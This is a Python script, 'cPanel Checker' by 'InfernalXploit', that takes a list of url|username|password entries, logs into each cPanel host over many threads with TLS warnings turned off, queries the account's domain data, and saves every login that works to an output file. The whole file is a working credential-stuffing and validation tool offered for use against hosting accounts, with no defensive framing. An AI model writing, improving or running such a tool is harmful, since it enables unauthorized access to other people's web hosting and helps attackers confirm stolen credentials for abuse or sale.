import requests
import sys
import json
import time
import argparse
import threading
import signal
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
from termcolor import colored

# Setup
requests.urllib3.disable_warnings()
init(autoreset=True)
pause_event = threading.Event()
pause_event.set()

# Constants
CPANEL_CHECKER_VERSION = "1.0"
AUTHOR = "InfernalXploit"
COPYRIGHT = "© 2025 InfernalXploit"
os.system('clear')
def print_banner():
    banner = r"""
 ██████╗██████╗        ██████╗██╗  ██╗███████╗██╗  ██╗███████╗██████╗
██╔════╝██╔══██╗      ██╔════╝██║  ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║     ██████╔╝█████╗██║     ███████║█████╗  █████╔╝ █████╗  ██████╔╝
██║     ██╔═══╝ ╚════╝██║     ██╔══██║██╔══╝  ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗██║           ╚██████╗██║  ██║███████╗██║  ██╗███████╗██║  ██║
 ╚═════╝╚═╝            ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 """
    print(colored(banner, 'cyan'))
    print(colored(f"Version: {CPANEL_CHECKER_VERSION}", 'yellow'))
    print(colored(f"Author : {AUTHOR}", 'yellow'))
    print(colored(COPYRIGHT, 'yellow'))
    print()

def check_update():
    try:
        resp = requests.get("https://raw.githubusercontent.com/TrixSec/cpanel-checker/main/VERSION")
        resp.raise_for_status()
        latest = resp.text.strip()

        if CPANEL_CHECKER_VERSION != latest:
            print(colored(f"[•] New version: {latest}. Updating...", 'yellow'))
            os.system('git reset --hard HEAD && git pull')
            with open('VERSION', 'w') as f:
                f.write(latest)
            print(colored("[•] Update done. Rerun this script.", 'green'))
            sys.exit()
        else:
            print(colored("[•] Using the latest version.", 'green'))

    except Exception as e:
        print(colored(f"[×] Update check failed: {e}", 'red'))

def login_and_check_domains(url, username, password, output_file):
    while not pause_event.is_set():
        time.sleep(0.1)

    try:
        s = requests.Session()
        login_data = {"user": username, "pass": password}
        resp = s.post(f"{url}/login/?login_only=1", data=login_data, timeout=20)
        result = json.loads(resp.text)

        if not result.get("status"):
            raise Exception("Login failed")

        token = result["security_token"][7:]
        dom_resp = s.post(
            f"{url}/cpsess{token}/execute/DomainInfo/domains_data",
            data={"return_https_redirect_status": "1"}
        )
        domain_data = json.loads(dom_resp.text)

        if domain_data.get("status") == 1:
            total = 1
            total += len(domain_data["data"].get("sub_domains", []))
            total += len(domain_data["data"].get("addon_domains", []))
            print(Fore.GREEN + f"[LOGIN SUCCESS] {url} | Total Domains: {total}")

            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{url}|{username}|{password}\n")
        else:
            raise Exception("Failed to fetch domain data")

    except Exception:
        print(Fore.RED + f"[LOGIN FAILED] {url}")
    finally:
        s.close()
        time.sleep(0.05)

def handle_ctrl_c(signum, frame):
    pause_event.clear()
    print(Fore.YELLOW + "\nCTRL+C detected!")
    while True:
        choice = input(Fore.CYAN + "[e]xit or [r]esume? ").strip().lower()
        if choice == 'e':
            print(Fore.RED + "Exiting...")
            sys.exit()
        elif choice == 'r':
            print(Fore.GREEN + "Resuming...")
            pause_event.set()
            break
        else:
            print("Enter 'e' or 'r' only.")

def main():
    parser = argparse.ArgumentParser(description="cPanel Checker")
    parser.add_argument("--file", help="Input file (format: url|user|pass)")
    parser.add_argument("--threads", type=int, help="Thread count")
    parser.add_argument("-o", help="Output file")
    parser.add_argument("--check-updates", action="store_true", help="Check for updates")
    args = parser.parse_args()

    if args.check_updates:
        check_update()
        return

    print_banner()

    input_file = args.file or input(Fore.CYAN + "Enter input filename: ").strip()
    output_file = args.o or f"{input_file}_success.txt"
    threads = args.threads or int(input(Fore.CYAN + "Enter thread count: ").strip())

    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            lines = [line.strip().split('|') for line in f if '|' in line]
    except FileNotFoundError:
        print(Fore.RED + f"File not found: {input_file}")
        return

    signal.signal(signal.SIGINT, handle_ctrl_c)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for entry in lines:
            if len(entry) == 3:
                url, user, pw = entry
                executor.submit(login_and_check_domains, url, user, pw, output_file)
            else:
                print(Fore.YELLOW + f"Invalid line: {'|'.join(entry)}")

if __name__ == "__main__":
    main()

